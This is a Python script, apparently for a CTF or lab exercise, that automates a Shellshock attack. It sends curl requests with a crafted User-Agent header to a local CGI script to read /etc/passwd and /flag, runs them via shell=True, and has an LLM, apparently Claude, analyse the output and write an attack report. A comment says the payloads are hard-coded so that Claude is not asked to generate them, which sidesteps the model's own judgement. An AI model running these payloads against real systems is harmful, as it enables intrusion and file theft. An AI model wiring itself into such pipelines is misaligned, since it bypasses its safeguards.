import subprocess
from modules.llm_engine import LLMEngine

# CVE별 공격 명령어 사전 정의 (Claude한테 생성 요청 X)
CVE_COMMANDS = {
    "shellshock": [
        'curl -H "User-Agent: () { :;}; echo; /bin/cat /etc/passwd" http://localhost:8080/cgi-bin/test.sh',
        'curl -H "User-Agent: () { :;}; echo; /bin/cat /flag" http://localhost:8080/cgi-bin/test.sh',
    ],
}

def run_command(command: str) -> str:
    """명령어를 실행하고 결과를 반환합니다."""
    try:
        result = subprocess.run(
            command,
            shell=True,
            capture_output=True,
            text=True,
            timeout=10
        )
        return result.stdout or result.stderr
    except subprocess.TimeoutExpired:
        return "❌ 명령어 실행 시간 초과"
    except Exception as e:
        return f"❌ 오류: {str(e)}"

def attack_cve(engine: LLMEngine, cve_type: str):
    """특정 CVE에 대한 자동 공격을 수행합니다."""
    print(f"\n{'='*50}")
    print(f"🎯 공격 대상: {cve_type.upper()}")
    print(f"{'='*50}")

    commands = CVE_COMMANDS.get(cve_type, [])
    attack_log = []

    for i, command in enumerate(commands, 1):
        print(f"\n[Step {i}] 명령어 실행 중...")
        print(f"$ {command}")

        output = run_command(command)
        print(f"결과: {output}")

        # Claude가 결과 분석
        print("\n🤖 Claude 분석 중...")
        analysis = engine.analyze_result(output, cve_type)
        print(f"분석: {analysis}")

        attack_log.append({
            "step": i,
            "command": command,
            "output": output,
            "analysis": analysis
        })

        # 성공 여부 확인 (flag 발견)
        if "flag" in output.lower() or "FLAG" in output:
            print("\n🚩 FLAG 발견! 공격 성공!")
            break

    return attack_log

def main():
    print("🚀 AIBB (AI BunkerBuster) 시작")

    engine = LLMEngine()

    # Shellshock 공격 실행
    attack_log = attack_cve(engine, "shellshock")

    # 최종 보고서 생성
    print("\n📄 최종 보고서 생성 중...")
    report = engine.generate_report(attack_log)
    print(report)

if __name__ == "__main__":
    main()